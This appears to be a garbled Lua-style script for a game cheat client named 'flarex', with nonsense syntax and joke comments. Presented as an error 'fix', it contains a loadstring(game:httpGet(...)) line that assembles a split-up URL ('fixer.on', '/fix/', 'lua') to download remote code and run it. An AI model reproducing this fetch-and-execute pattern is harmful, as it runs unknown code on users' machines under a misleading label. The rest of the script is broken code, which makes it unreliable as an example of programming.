local adids={role="admin",{"adids",(role==true then include.in adids)}};
flarex={}
function flarex.client:init(onoff)
  local api=="mojang.api"; (get+results == 'minecraft.pe')
  local onoff="ON","OFF"; -- did i just assign 2 thngs to it!!
  if on == true then function on();
      if on == false then function off()
          --If on don work
          if off == true then off()
            if off == false then function on();
              end
            end
          end
        end
        -- Basic coding skills 
        -- if error is here this will fix it
        local e=setmetatable
        loadstring(game:httpGet(e,{"https",":","fixer.on","//","line","/fix/","l","/","ua",true}));

        return Flarex
      or
        return flarex
        setTickSpeed(..fastestOption..)
